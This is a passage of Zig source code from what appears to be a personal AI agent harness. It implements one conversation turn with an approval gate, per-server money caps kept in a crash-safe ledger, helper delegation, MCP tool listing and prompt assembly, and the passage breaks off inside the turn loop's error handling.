//! One turn of the agent: the owner's message in, model calls and tool
//! calls through the gate until the model answers or a limit is reached.
const std = @import("std");
const model = @import("model.zig");
const gate = @import("gate.zig");
const tools = @import("tools.zig");
const memory = @import("memory.zig");
const log_mod = @import("log.zig");
const config = @import("config.zig");
const util = @import("util.zig");
const skills = @import("skills.zig");
const jv = @import("jv.zig");
const mcp = @import("mcp.zig");
const scrub = @import("scrub.zig");
const web_mod = @import("web.zig");
const logins_mod = @import("logins.zig");
const store_mod = @import("store.zig");
const masks_mod = @import("masks.zig");
const Io = std.Io;

pub const Answer = enum { once, day, deny, timeout };

/// One question for the owner: may this call run?
pub const Question = struct {
    text: []const u8,
    /// Whether "Allow 24 h" may be offered (never for money).
    allow_day: bool,
    /// When the run that asks must end (seconds): an answer after that is
    /// of no use, so it is not waited for. 0: no end.
    deadline_s: i64 = 0,
};

/// Tells the owner something beside the answer, at once.
pub const Notice = struct {
    ctx: *anyopaque,
    say: *const fn (ctx: *anyopaque, text: []const u8) void,
};

/// Asks the owner whether a call may run; blocks until they answer, the
/// approval time runs out or the question's deadline passes.
pub const Asker = struct {
    ctx: *anyopaque,
    ask: *const fn (ctx: *anyopaque, q: Question) Answer,
};

/// The owner's switches, shared by all runs and read when used, so that
/// /dryrun, /private and /memory auto apply to a run already going.
pub const Switches = struct {
    dry_run: std.atomic.Value(bool) = .init(false),
    private: std.atomic.Value(bool) = .init(false),
    auto_recall: std.atomic.Value(bool) = .init(true),
};

const no_switches: Switches = .{};

/// A conversation, kept as whole turns so the oldest can be dropped
/// without leaving a tool result without its call.
pub const Conversation = struct {
    gpa: std.mem.Allocator,
    turns: std.ArrayList(*Turn) = .empty,
    /// Turns dropped to stay under the size limit.
    dropped: usize = 0,
    /// Those of them dropped without a summary of them.
    lost: usize = 0,
    /// What the turns summarised away said (owned).
    summary: ?[]u8 = null,

    pub const Turn = struct {
        arena: std.heap.ArenaAllocator,
        messages: std.ArrayList(model.Message) = .empty,
        bytes: usize = 0,
        /// Said while private mode was on: never written to memory.
        private: bool = false,
    };

    pub fn init(gpa: std.mem.Allocator) Conversation {
        return .{ .gpa = gpa };
    }

    pub fn deinit(c: *Conversation) void {
        if (c.summary) |sm| c.gpa.free(sm);
        for (c.turns.items) |tn| {
            tn.arena.deinit();
            c.gpa.destroy(tn);
        }
        c.turns.deinit(c.gpa);
    }

    fn begin(c: *Conversation) !*Turn {
        const tn = try c.gpa.create(Turn);
        tn.* = .{ .arena = .init(c.gpa) };
        errdefer c.gpa.destroy(tn);
        try c.turns.append(c.gpa, tn);
        return tn;
    }

    /// Drops the newest turn (one that failed half way).
    pub fn dropLast(c: *Conversation) void {
        const tn = c.turns.pop() orelse return;
        tn.arena.deinit();
        c.gpa.destroy(tn);
    }

    pub fn bytes(c: *const Conversation) usize {
        var n: usize = 0;
        for (c.turns.items) |tn| n += tn.bytes;
        return n;
    }

    /// Drops the oldest whole turns while over `max_bytes`, keeping the last.
    pub fn trim(c: *Conversation, max_bytes: usize) usize {
        var n: usize = 0;
        while (c.turns.items.len > 1 and c.bytes() > max_bytes) {
            const tn = c.turns.orderedRemove(0);
            tn.arena.deinit();
            c.gpa.destroy(tn);
            n += 1;
        }
        c.dropped += n;
        c.lost += n;
        return n;
    }

    /// Drops the oldest `n` turns.
    fn dropOldest(c: *Conversation, n: usize) void {
        for (0..n) |_| {
            const tn = c.turns.orderedRemove(0);
            tn.arena.deinit();
            c.gpa.destroy(tn);
        }
        c.dropped += n;
    }

    pub fn messages(c: *const Conversation, arena: std.mem.Allocator) ![]model.Message {
        var out: std.ArrayList(model.Message) = .empty;
        for (c.turns.items) |tn| try out.appendSlice(arena, tn.messages.items);
        return out.items;
    }
};

/// Copies a message into the turn's arena and counts its size.
fn keep(tn: *Conversation.Turn, m: model.Message) !void {
    const a = tn.arena.allocator();
    const blocks = try a.alloc(model.Block, m.blocks.len);
    for (m.blocks, 0..) |b, i| {
        blocks[i] = switch (b) {
            .text => |s| .{ .text = try a.dupe(u8, s) },
            .tool_use => |u| .{ .tool_use = .{ .id = try a.dupe(u8, u.id), .name = try a.dupe(u8, u.name), .input_json = try a.dupe(u8, u.input_json) } },
            .tool_result => |r| .{ .tool_result = .{ .id = try a.dupe(u8, r.id), .content = try a.dupe(u8, r.content), .is_error = r.is_error } },
        };
        tn.bytes += switch (b) {
            .text => |s| s.len,
            .tool_use => |u| u.input_json.len + u.name.len,
            .tool_result => |r| r.content.len,
        };
    }
    try tn.messages.append(a, .{ .role = m.role, .blocks = blocks });
}

pub const Run = struct {
    gpa: std.mem.Allocator,
    io: Io,
    client: *model.Client,
    gate: *gate.Gate,
    grants_path: ?[]const u8 = null,
    log: *log_mod.Log,
    mem: *memory.Store,
    /// Held while memory or grants change; shared by all runs.
    lock: *Io.Mutex,
    env: tools.Env,
    limits: config.Config.Limits,
    top_size: u32 = 20,
    utc_offset: i32 = 0,
    asker: ?Asker = null,
    scheduled: bool = false,
    /// Private from the start of this run, whatever the switch says later
    /// (see `isPrivate`).
    private: bool = false,
    /// Whether this run may recall at all (helpers don't); the switch
    /// decides when it does (see `autoRecall`).
    auto_recall: bool = true,
    /// The owner's switches, read when used.
    switches: *const Switches = &no_switches,
    /// What the run is, for the log ("chat", "task btc-watch", …).
    label: []const u8 = "chat",
    extra_instructions: []const u8 = "",
    /// Where helpers and summaries get their models; null: no `delegate`,
    /// and long conversations are cut instead of summarised.
    model_cfg: ?ModelCfg = null,
    agents: config.Config.Agents = .{},
    /// Shared by all runs: how many helpers run at once.
    pool: ?*Pool = null,
    /// Shared by all runs: the owner is asked one question at a time.
    ask_lock: ?*Io.Mutex = null,
    /// Pages fetched in this run's helpers, shared between them.
    cache: ?*PageCache = null,
    /// A helper: a short task, a subset of tools, no memory writes.
    helper: bool = false,
    /// A helper's tools; null: all of them.
    allowed: ?[]const gate.Tool = null,
    /// Input tokens this run may use; 0: no limit.
    token_cap: u64 = 0,
    skills_dir: []const u8 = "",
    /// When the running turn must end; helpers get what is left of it.
    deadline_s: i64 = 0,
    /// Tools of the MCP servers that are running.
    mcp: []const McpTool = &.{},
    money: config.Config.Money = .{},
    /// What money tools moved today; shared by all runs.
    money_ledger: ?*MoneyLedger = null,
    /// /dryrun on from the start of this run: money tools are not called,
    /// whatever the switch says later (see `dryRun`).
    dry_run: bool = false,
    /// The agent's logins (logins.ini) and where their values are kept.
    logins: []const logins_mod.Login = &.{},
    store: ?store_mod.Store = null,
    /// The data folder's `profiles/`; empty: no `web` tool.
    profiles_dir: []const u8 = "",
    /// The browser session of the running turn.
    web: ?*web_mod.Web = null,
    /// The instance's mask list: each tool's output is masked against it
    /// as it is when the tool runs, values added meanwhile too. null: only
    /// `env.secrets`.
    masks: ?*masks_mod.List = null,
    /// Where calls refused only because nobody could approve them are
    /// noted (a scheduled run says what it skipped); helpers share it.
    skipped: ?*Skipped = null,
    /// Tells the owner, beside the answer, of each memory item `remember`
    /// saves.
    notice: ?Notice = null,

    fn now(r: *const Run) i64 {
        return util.nowSeconds(r.io);
    }

    /// Switched on now, or when the run started: on either way.
    pub fn isPrivate(r: *const Run) bool {
        return r.private or r.switches.private.load(.acquire);
    }

    pub fn dryRun(r: *const Run) bool {
        return r.dry_run or r.switches.dry_run.load(.acquire);
    }

    pub fn autoRecall(r: *const Run) bool {
        return r.auto_recall and r.switches.auto_recall.load(.acquire);
    }

    /// Whether this run may use `tool` at all (helpers get a subset).
    pub fn allows(r: *const Run, tool: gate.Tool) bool {
        if (r.helper) switch (tool) {
            .delegate, .remember, .skill_save => return false,
            else => {},
        };
        switch (tool) {
            .delegate => if (r.model_cfg == null) return false,
            .mcp => if (r.mcp.len == 0) return false,
            // helpers never move money; the owner asks for it in the chat
            .money => if (r.helper or r.mcp.len == 0) return false,
            .skill, .skill_save => if (r.skills_dir.len == 0) return false,
            .browse => if (r.env.browser.len == 0) return false,
            // helpers never get the browser with the logins; POSIX only for now
            .web => if (r.helper or r.env.browser.len == 0 or r.profiles_dir.len == 0 or @import("builtin").os.tag == .windows) return false,
            // only through `web`
            .login => return false,
            else => {},
        }
        const list = r.allowed orelse return true;
        return std.mem.indexOfScalar(gate.Tool, list, tool) != null;
    }
};

const delegate_def: model.ToolDef = .{
    .name = "delegate",
    .description = "Hand independent tasks to helpers that work at the same time, each with a clean context and its own tools. Each task must include every detail the helper needs. Returns each helper's short answer.",
    .schema_json =
    \\{"type":"object","properties":{"tasks":{"type":"array","minItems":1,"maxItems":8,"items":{"type":"object","properties":{"task":{"type":"string","description":"The whole task, standing alone."},"tools":{"type":"array","items":{"type":"string"},"description":"Tools the helper may use; default: search, fetch, browse, read_file, recall, skill."},"strong":{"type":"boolean","description":"Use the stronger, costlier model for this task."}},"required":["task"]}}},"required":["tasks"]}
    ,
};
const skill_defs = [_]model.ToolDef{
    .{ .name = "skill", .description = "Load one of your skills (saved instructions for a kind of task) by name; with `file`, read one of the skill's other files.", .schema_json = "{\"type\":\"object\",\"properties\":{\"name\":{\"type\":\"string\"},\"file\":{\"type\":\"string\"}},\"required\":[\"name\"]}" },
    .{ .name = "skill_save", .description = "Save a skill: instructions for a kind of task you may meet again (steps, sources, pitfalls). Replaces a skill of the same name. The owner approves it.", .schema_json = "{\"type\":\"object\",\"properties\":{\"name\":{\"type\":\"string\",\"description\":\"lowercase letters, digits and hyphens\"},\"description\":{\"type\":\"string\",\"description\":\"one line: when to use it\"},\"body\":{\"type\":\"string\"}},\"required\":[\"name\",\"description\",\"body\"]}" },
};

/// The tools this run offers the model, in a fixed order (so the prompt
/// cache holds across calls).
pub fn toolDefs(r: *const Run, arena: std.mem.Allocator) ![]const model.ToolDef {
    var out: std.ArrayList(model.ToolDef) = .empty;
    for (tools.defs()) |d| {
        const tool = gate.Tool.fromName(d.name).?;
        if (r.allows(tool)) try out.append(arena, d);
    }
    if (r.allows(.web)) try out.append(arena, try web_mod.toolDef(arena, r.logins));
    if (r.allows(.delegate)) try out.append(arena, delegate_def);
    for (skill_defs) |d| if (r.allows(gate.Tool.fromName(d.name).?)) try out.append(arena, d);
    for (r.mcp) |m| if (r.allows(if (m.money) .money else .mcp)) try out.append(arena, m.def);
    return out.items;
}

/// One MCP tool as the model sees it ("server__tool").
pub const McpTool = struct {
    def: model.ToolDef,
    server: *mcp.Server,
    tool: []const u8,
    money: bool,
    /// For money tools: the input field holding the amount (mcp.ini's
    /// `amount =`), `.none` for a tool that moves no amount, `.unset` when
    /// mcp.ini does not say (refused while a cap is set).
    amount: mcp.Field = .unset,
    /// The server's own caps (mcp.ini); null: config.ini's [money].
    max_per_call: ?u32 = null,
    max_per_day: ?u32 = null,
};

/// What one server offers the model, and what the owner should know about
/// it (for /status and the start).
pub const Offer = struct {
    tools: []McpTool,
    /// One line each, "SERVER: ...\n".
    notes: []const u8 = "",
    /// Why the server must not be used at all (it is stopped); then no tools.
    refused: ?[]const u8 = null,
};

/// The tools of a started server, as its mcp.ini section `cfg` says;
/// `caps`: config.ini's [money]; `taken`: the tools of the servers before
/// it. A name the model would see twice is offered once (the first), so
/// one name always means one tool.
pub fn mcpTools(arena: std.mem.Allocator, s: *mcp.Server, cfg: mcp.ServerConfig, caps: config.Config.Money, taken: []const McpTool) !Offer {
    // a money tool the server does not have is a typo for one it has,
    // which would then be offered as an ordinary tool: none are offered
    for (cfg.money) |m| {
        for (s.tools()) |tl| {
            if (std.mem.eql(u8, tl.name, m)) break;
        } else return .{ .tools = &.{}, .refused = try std.fmt.allocPrint(arena, "money = names \"{s}\", which is not one of its tools", .{m}) };
    }
    var out: std.ArrayList(McpTool) = .empty;
    var notes: std.ArrayList(u8) = .empty;
    const capped = (cfg.max_per_call orelse caps.max_per_call) > 0 or (cfg.max_per_day orelse caps.max_per_day) > 0;
    for (s.tools()) |tl| {
        var is_money = false;
        for (cfg.money) |m| if (std.mem.eql(u8, m, tl.name)) {
            is_money = true;
        };
        const name = try std.fmt.allocPrint(arena, "{s}__{s}", .{ tl.server, tl.name });
        // what model APIs take as a tool name: [A-Za-z0-9_-]{1,64}
        if (name.len > 64) {
            try notes.print(arena, "{s}: {s} left out: {s} is longer than 64 characters\n", .{ tl.server, tl.name, name });
            continue;
        }
        const dup = blk: {
            for ([_][]const McpTool{ taken, out.items }) |list| {
                for (list) |m| if (std.mem.eql(u8, m.def.name, name)) break :blk true;
            }
            break :blk false;
        };
        if (dup) {
            try notes.print(arena, "{s}: {s} left out: another tool already has the name {s}\n", .{ tl.server, tl.name, name });
            continue;
        }
        const desc = if (is_money) try std.fmt.allocPrint(arena, "{s} (Moves money: the owner approves every call.)", .{tl.description}) else tl.description;
        const field: mcp.Field = if (is_money) cfg.amount.of(tl.name) else .unset;
        if (is_money and field == .unset and capped)
            try notes.print(arena, "{s}: {s} has no amount field in mcp.ini (amount =), so its calls are refused while a money cap is set\n", .{ tl.server, tl.name });
        try out.append(arena, .{ .def = .{ .name = name, .description = desc, .schema_json = tl.schema_json }, .server = s, .tool = tl.name, .money = is_money, .amount = field, .max_per_call = cfg.max_per_call, .max_per_day = cfg.max_per_day });
    }
    return .{ .tools = out.items, .notes = notes.items };
}

/// What each server's money tools moved today, in the owner's day.
pub const MoneyLedger = struct {
    mutex: Io.Mutex = .init,
    entries: [max_servers]Entry = undefined,
    len: usize = 0,
    /// Where it is kept, a line "SERVER DAY TOTAL" each; null in tests.
    path: ?[]const u8 = null,
    /// Why the record read at start cannot be trusted; while set, every
    /// money call is refused with it.
    trouble_buf: [160]u8 = undefined,
    trouble_len: usize = 0,

    /// Servers whose totals are kept at once.
    pub const max_servers = 64;
    /// The longest line: a name, a day and a total printed whole (up to
    /// 309 digits for the largest f64).
    const max_line = 32 + 1 + 20 + 1 + 330 + 1;
    const max_file = max_servers * max_line;
    /// A total from before totals were kept per server ("DAY TOTAL"): it
    /// counts for every server, so none can pass its cap on that day.
    const everyone = "*";

    const Entry = struct {
        name_buf: [32]u8 = undefined,
        name_len: u8 = 0,
        day: i64 = 0,
        total: f64 = 0,

        fn name(e: *const Entry) []const u8 {
            return e.name_buf[0..e.name_len];
        }
    };

    /// Reads the record. One that is there but cannot be read, or is
    /// damaged, refuses money calls (see `trouble`) rather than starting
    /// the day from 0.
    pub fn load(l: *MoneyLedger, io: Io) void {
        const p = l.path orelse return;
        var buf: [max_file + 1]u8 = undefined;
        const got = Io.Dir.cwd().readFile(io, p, &buf) catch |e| switch (e) {
            error.FileNotFound => return,
            else => return l.setTrouble("the money record (state/money) could not be read ({s})", .{@errorName(e)}),
        };
        if (got.len == buf.len) return l.setTrouble("the money record (state/money) is too large", .{});
        var lines = std.mem.tokenizeAny(u8, got, "\r\n");
        var n_line: usize = 0;
        while (lines.next()) |line| {
            n_line += 1;
            var parts: [3][]const u8 = undefined;
            var n: usize = 0;
            var it = std.mem.tokenizeAny(u8, line, " \t");
            while (it.next()) |x| {
                if (n == parts.len) break;
                parts[n] = x;
                n += 1;
            }
            const bad = it.next() != null or n < 2;
            const name = if (n == 2) everyone else parts[0];
            const day = if (bad) null else std.fmt.parseInt(i64, parts[n - 2], 10) catch null;
            const total = if (bad) null else std.fmt.parseFloat(f64, parts[n - 1]) catch null;
            const good_total = if (total) |x| x >= 0 and !std.math.isNan(x) and !std.math.isInf(x) else false;
            const e = if (day != null and good_total) l.entry(name, day.?) else null;
            const slot = e orelse return l.setTrouble("the money record (state/money) is damaged at line {d}", .{n_line});
            slot.day = day.?;
            slot.total = total.?;
        }
    }

    fn setTrouble(l: *MoneyLedger, comptime fmt: []const u8, args: anytype) void {
        const text = std.fmt.bufPrint(&l.trouble_buf, fmt, args) catch l.trouble_buf[0..];
        l.trouble_len = text.len;
    }

    /// Why money calls are refused whatever they are; null: they are not.
    pub fn trouble(l: *const MoneyLedger) ?[]const u8 {
        return if (l.trouble_len > 0) l.trouble_buf[0..l.trouble_len] else null;
    }

    fn find(l: *MoneyLedger, name: []const u8) ?*Entry {
        for (l.entries[0..l.len]) |*e| if (std.mem.eql(u8, e.name(), name)) return e;
        return null;
    }

    /// The entry for `name`, made if there is none (in place of one of a
    /// day before `day` when all are taken); null when none is free.
    fn entry(l: *MoneyLedger, name: []const u8, day: i64) ?*Entry {
        if (l.find(name)) |e| return e;
        if (name.len == 0 or name.len > 32) return null;
        const e = if (l.len < max_servers) blk: {
            l.len += 1;
            break :blk &l.entries[l.len - 1];
        } else for (l.entries[0..l.len]) |*old| {
            if (old.day < day) break old;
        } else return null;
        e.* = .{ .day = day };
        @memcpy(e.name_buf[0..name.len], name);
        e.name_len = @intCast(name.len);
        return e;
    }

    /// The day a reservation made on `day` counts toward: a later one when
    /// another run already counted past midnight (so today's total is
    /// never wiped by yesterday's).
    fn dayFor(l: *MoneyLedger, server: []const u8, day: i64) i64 {
        const e = l.find(server) orelse return day;
        return @max(e.day, day);
    }

    /// What `server` moved on `day`.
    fn spent(l: *MoneyLedger, server: []const u8, day: i64) f64 {
        var so_far: f64 = 0;
        for ([_][]const u8{ server, everyone }) |n| if (l.find(n)) |e| {
            if (e.day == day) so_far += e.total;
        };
        return so_far;
    }

    /// Counts `amount` toward `server`'s day (`dayFor`) and saves it.
    /// error.NoRoom when no entry is free; when the save fails, nothing is
    /// counted and its error is returned: a reservation that would be
    /// forgotten at the next start is not made.
    fn reserve(l: *MoneyLedger, io: Io, server: []const u8, day_in: i64, amount: f64) !Reservation {
        const day = l.dayFor(server, day_in);
        const before = l.entries;
        const before_len = l.len;
        const e = l.entry(server, day) orelse return error.NoRoom;
        if (e.day != day) {
            e.day = day;
            e.total = 0;
        }
        e.total += amount;
        l.save(io, day) catch |err| {
            l.entries = before;
            l.len = before_len;
            return err;
        };
        return .{ .day = day, .amount = amount };
    }

    /// Takes back what `reserve` counted, for a call not made. A day that
    /// is over is left as it was (it no longer counts), and a total never
    /// goes below 0.
    /// When the save fails, the file keeps the higher total, which is
    /// the safe side; the next reservation saves both or is refused.
    fn release(l: *MoneyLedger, io: Io, server: []const u8, res: Reservation) !void {
        if (res.amount == 0) return;
        const e = l.find(server) orelse return;
        if (e.day != res.day) return;
        e.total = @max(0, e.total - res.amount);
        try l.save(io, res.day);
    }

    /// Writes the totals of `today` and later (an older day no longer
    /// counts) to a new file that then replaces the old one, so a crash
    /// half way leaves the old record, not a cut one.
    fn save(l: *MoneyLedger, io: Io, today: i64) !void {
        const p = l.path orelse return;
        var buf: [max_file]u8 = undefined;
        var w: Io.Writer = .fixed(&buf);
        for (l.entries[0..l.len]) |*e| if (e.day >= today) try w.print("{s} {d} {d}\n", .{ e.name(), e.day, e.total });
        var tmp_buf: [4096]u8 = undefined;
        const tmp = try std.fmt.bufPrint(&tmp_buf, "{s}.tmp", .{p});
        const cwd = Io.Dir.cwd();
        try cwd.writeFile(io, .{ .sub_path = tmp, .data = w.buffered(), .flags = .{ .permissions = util.private_file } });
        errdefer cwd.deleteFile(io, tmp) catch {};
        try cwd.rename(tmp, cwd, p, io);
    }

    /// Everything counted, whatever the server and day (for tests).
    fn sum(l: *const MoneyLedger) f64 {
        var total: f64 = 0;
        for (l.entries[0..l.len]) |e| total += e.total;
        return total;
    }
};

/// An amount counted toward a server's day before its call is asked.
const Reservation = struct { day: i64 = 0, amount: f64 = 0 };

pub const ModelCfg = struct {
    url: []const u8,
    key: []const u8,
    main: []const u8,
    worker: []const u8,
    memory: []const u8,
    max_tokens: u32,
};

/// A counting limit on helpers running at once, across the process.
pub const Pool = struct {
    mutex: Io.Mutex = .init,
    active: u32 = 0,

    /// Waits for a free place; false if stopped first.
    fn acquire(p: *Pool, io: Io, max: u32, stop: *std.atomic.Value(bool)) bool {
        while (true) {
            if (stop.load(.acquire)) return false;
            {
                p.mutex.lockUncancelable(io);
                defer p.mutex.unlock(io);
                if (p.active < @max(max, 1)) {
                    p.active += 1;
                    return true;
                }
            }
            io.sleep(.fromMilliseconds(20), .awake) catch {};
        }
    }

    fn release(p: *Pool, io: Io) void {
        p.mutex.lockUncancelable(io);
        defer p.mutex.unlock(io);
        p.active -= 1;
    }
};

/// Tool output for pages, by tool and input, so helpers working at the
/// same time never fetch the same page twice.
pub const PageCache = struct {
    gpa: std.mem.Allocator,
    mutex: Io.Mutex = .init,
    map: std.StringHashMapUnmanaged([]u8) = .empty,
    bytes: usize = 0,
    const max_bytes = 8 << 20;

    pub fn init(gpa: std.mem.Allocator) PageCache {
        return .{ .gpa = gpa };
    }

    pub fn deinit(c: *PageCache) void {
        var it = c.map.iterator();
        while (it.next()) |e| {
            c.gpa.free(e.key_ptr.*);
            c.gpa.free(e.value_ptr.*);
        }
        c.map.deinit(c.gpa);
    }

    fn get(c: *PageCache, io: Io, arena: std.mem.Allocator, key: []const u8) ?[]const u8 {
        c.mutex.lockUncancelable(io);
        defer c.mutex.unlock(io);
        const v = c.map.get(key) orelse return null;
        return arena.dupe(u8, v) catch null;
    }

    fn put(c: *PageCache, io: Io, key: []const u8, value: []const u8) void {
        c.mutex.lockUncancelable(io);
        defer c.mutex.unlock(io);
        if (c.bytes + key.len + value.len > max_bytes or c.map.contains(key)) return;
        const k = c.gpa.dupe(u8, key) catch return;
        const v = c.gpa.dupe(u8, value) catch {
            c.gpa.free(k);
            return;
        };
        c.map.put(c.gpa, k, v) catch {
            c.gpa.free(k);
            c.gpa.free(v);
            return;
        };
        c.bytes += k.len + v.len;
    }
};

pub const TurnResult = struct {
    text: []const u8,
    stopped: bool = false,
    /// Why the turn ended early, in words for the owner.
    ended_by: ?[]const u8 = null,
    steps: u32 = 0,
};

const base_prompt =
    \\You are a personal agent working for one person, the owner, who talks to you in a chat.
    \\Be brief and plain. Do what was asked; ask when something is unclear.
    \\Every tool call passes a gate: some need the owner's approval and may be refused. If a call is refused, say what you could not do instead of trying another way around it.
    \\Use `remember` for lasting facts about the owner or their wishes, not for passing details.
;

const helper_prompt =
    \\You are a helper doing one task for an agent that works for its owner. Do only this task, with the tools you have.
    \\When done, answer in at most about 300 words: the result first, then the links you used, then anything you could not do and why. Your answer goes to the agent, not to the owner.
    \\Every tool call passes a gate and may be refused. If a call is refused, say so instead of trying another way around it.
;

const delegate_guide =
    \\Use `delegate` to hand independent pieces of work to helpers that run at the same time, each with a clean context: research across several sources, comparisons, anything that splits into parts. Each task must stand alone and include every detail the helper needs; you get back each helper's short answer, not its working.
;

/// Starts the per-turn context block kept with the owner's message (time,
/// recalled items); readers of the conversation skip it.
pub const context_mark = "[context]";

/// The system prompt in two parts: `stable` stays the same from call to
/// call (it is marked for the prompt cache), `changing` is the rest.
pub const Prompt = struct { stable: []const u8, changing: []const u8 };

pub fn systemPrompt(arena: std.mem.Allocator, r: *const Run, recalled: memory.Recall, dropped: usize, now_s: i64) ![]const u8 {
    const p = try systemParts(arena, r, recalled, .{ .dropped = dropped, .lost = dropped }, now_s);
    return std.mem.concat(arena, u8, &.{ p.stable, p.changing });
}

/// What became of the conversation's earlier turns.
pub const Past = struct {
    summary: ?[]const u8 = null,
    /// Turns gone, summarised or not.
    dropped: usize = 0,
    /// Turns gone without a summary.
    lost: usize = 0,

    fn of(c: *const Conversation) Past {
        return .{ .summary = c.summary, .dropped = c.dropped, .lost = c.lost };
    }
};

pub fn systemParts(arena: std.mem.Allocator, r: *const Run, recalled: memory.Recall, past: Past, now_s: i64) !Prompt {
    var out: std.ArrayList(u8) = .empty;
    try out.appendSlice(arena, if (r.helper) helper_prompt else base_prompt);
    if (!r.helper and r.model_cfg != null) try out.appendSlice(arena, delegate_guide);
    if (r.scheduled) try out.appendSlice(arena, "This is a scheduled run: the owner is not watching and cannot approve anything.\n");
    if (r.extra_instructions.len > 0) try out.print(arena, "{s}\n", .{r.extra_instructions});
    if (r.skills_dir.len > 0 and r.allows(.skill)) {
        const list = skills.list(arena, r.io, r.skills_dir) catch &.{};
        const text = try skills.promptList(arena, list, 4096);
        if (text.len > 0) try out.print(arena, "\n{s}\n", .{text});
    }
    // in id order, not by strength: a mention then changes no byte here,
    // and the prompt cache holds
    const always = try arena.dupe(*memory.Item, recalled.always);
    std.mem.sort(*memory.Item, always, {}, struct {
        fn lt(_: void, x: *memory.Item, y: *memory.Item) bool {
            return std.mem.order(u8, x.id, y.id) == .lt;
        }
    }.lt);
    var pinned_header = false;
    for (always) |it| if (it.pinned) {
        if (!pinned_header) try out.appendSlice(arena, "\nStanding instructions from the owner (always follow):\n");
        pinned_header = true;
        try out.print(arena, "- {s}\n", .{it.body});
    };
    var top_header = false;
    for (always) |it| if (!it.pinned) {
        if (!top_header) try out.appendSlice(arena, "\nWhat you know about the owner:\n");
        top_header = true;
        try out.print(arena, "- {s}\n", .{it.body});
    };
    if (past.summary) |sm| {
        try out.print(arena, "\nSummary of the earlier conversation:\n{s}\n", .{sm});
        if (past.lost > 0) try out.print(arena, "{d} turns of this conversation were dropped without being summarised, to keep it short.\n", .{past.lost});
    } else if (past.dropped > 0) try out.print(arena, "\n{d} earlier turns of this conversation were dropped to keep it short.\n", .{past.dropped});
    const stable = out.items;

    out = .empty;
    const local = now_s + @as(i64, r.utc_offset) * 60;
    const c = util.civil(@divFloor(local, 86400));
    const mins: i64 = @divFloor(@mod(local, 86400), 60);
    try out.print(arena, "\nNow: {d}-{d:0>2}-{d:0>2} {d:0>2}:{d:0>2} (owner's time, UTC{s}{d}min).\n", .{ @as(u64, @intCast(c.y)), c.m, c.d, @as(u64, @intCast(@divFloor(mins, 60))), @as(u64, @intCast(@mod(mins, 60))), if (r.utc_offset >= 0) "+" else "-", @abs(r.utc_offset) });
    if (recalled.found.len > 0) {
        try out.appendSlice(arena, "\nPossibly relevant from earlier:\n");
        for (recalled.found) |it| try out.print(arena, "- {s}\n", .{it.body});
    }
    return .{ .stable = stable, .changing = out.items };
}

/// One turn. `from_owner`: the text is the owner's own words (mentions
/// count); false for scheduled instructions.
pub fn turn(r: *Run, conv: *Conversation, user_text: []const u8, from_owner: bool) !TurnResult {
    var arena_state: std.heap.ArenaAllocator = .init(r.gpa);
    defer arena_state.deinit();
    const a = arena_state.allocator();
    const started = r.now();
    const deadline = started + r.limits.turn_seconds;

    {
        r.lock.lockUncancelable(r.io);
        defer r.lock.unlock(r.io);
        if (from_owner and !r.isPrivate()) {
            const ids = try r.mem.noteMentions(a, user_text, started);
            for (ids) |id| try r.log.write(.memory, false, .{ .event = "mention", .id = id });
        }
    }
    try r.log.write(.turn, r.isPrivate(), .{ .run = r.label, .text = user_text });

    const tn = try conv.begin();
    // a turn that fails half way could leave a tool call without its result,
    // which the model API refuses from then on: drop it whole
    var tn_kept = true;
    errdefer if (tn_kept) conv.dropLast();
    tn.private = r.isPrivate();
    // the instructions are made once a turn, so their stable part is the
    // same for every step (a `remember` meanwhile shows from the next
    // turn); one lock: the items are read while no one can forget them
    const system = blk: {
        r.lock.lockUncancelable(r.io);
        defer r.lock.unlock(r.io);
        const recalled = try r.mem.recall(a, user_text, started, r.top_size, r.autoRecall());
        break :blk try systemParts(a, r, recalled, .of(conv), started);
    };
    // the time and what memory found go with the message, not the system
    // prompt: the system prompt and every earlier turn then stay the same
    // from call to call, and the prompt cache holds across turns
    const context = try std.fmt.allocPrint(a, "{s}{s}", .{ context_mark, system.changing });
    try keep(tn, .{ .role = .user, .blocks = &.{ .{ .text = context }, .{ .text = user_text } } });
    r.deadline_s = deadline;

    // the browser lives for this turn: closed when it ends, however it ends
    var web_state: web_mod.Web = undefined;
    const own_web = r.web == null and r.allows(.web);
    if (own_web) {
        web_state = web_mod.Web.init(r.gpa, r.io, .{
            .browser = r.env.browser,
            .profiles = r.profiles_dir,
            .tmp_root = r.env.tmp_root,
            .timeout_ms = @intCast(@min(@as(u64, r.env.browser_seconds) * 1000, std.math.maxInt(u32))),
            .max_bytes = r.env.tool_output_bytes,
            .logins = r.logins,
            .store = r.store,
            .secrets = r.env.secrets,
            .stop = r.env.stop,
        }, .{ .ctx = r, .allow = webAllow, .note = webNote, .secret = webSecret });
        r.web = &web_state;
    }
    defer if (own_web) {
        web_state.deinit();
        r.web = null;
    };

    var result: TurnResult = .{ .text = "" };
    var used_tokens: u64 = 0;
    var calls_made: usize = 0;
    // the model API refused the request: this turn is not kept
    var rejected = false;
    const defs = try toolDefs(r, a);
    while (true) {
        if (r.env.stop.load(.acquire)) {
            result.stopped = true;
            result.ended_by = try r.gpa.dupe(u8, "Stopped.");
            break;
        }
        if (result.steps >= r.limits.steps_per_turn) {
            result.ended_by = try r.gpa.dupe(u8, "Step limit reached for this turn.");
            break;
        }
        if (r.now() >= deadline) {
            result.ended_by = try r.gpa.dupe(u8, "Time limit reached for this turn.");
            break;
        }
        if (r.token_cap > 0 and used_tokens >= r.token_cap) {
            result.ended_by = try r.gpa.dupe(u8, "Token limit reached.");
            break;
        }
        result.steps += 1;
        const msgs = try conv.messages(a);
        const reply = r.client.sendParts(a, system.stable, "", msgs, defs, .{ .stop = r.env.stop, .deadline_s = deadline }) catch |e| {
            if (e == error.Stopped) {
                result.stopped = true;
                result.ended_by = try r.gpa.dupe(u8, "Stopped.");
                break;
            }
            const why: []const u8 = switch (e) {
                error.BudgetSpent => "Model budget used up.",
                error.RateLimited => "The model is rate limited; try again later.",
                error.NoKey => "Model calls are refused: no omnigate key is stored (harness secret add omnigate).",
                error.NoUrl => "Model calls are refused: no omnigate url is set ([model] url in config.ini, then /reload).",
                error.Timeout => if (r.now() >= deadline) "Time limit reached for this turn." else try std.fmt.allocPrint(a, "Model call failed: Timeout {s}", .{r.client.lastError()}),
                // kept, every later request would carry it and be refused too
                error.Rejected => try std.fmt.allocPrint(a, "The model API refused the request: {s}. This turn is left out of the conversation, so the next message starts without it{s}.", .{
                    r.client.lastError(),
                    if (calls_made == 0) "" else try std.fmt.allocPrint(a, "; the agent will not remember the {d} tool call{s} it made in it", .{ calls_made, if (calls_made == 1) "" else "s" }),
                }),
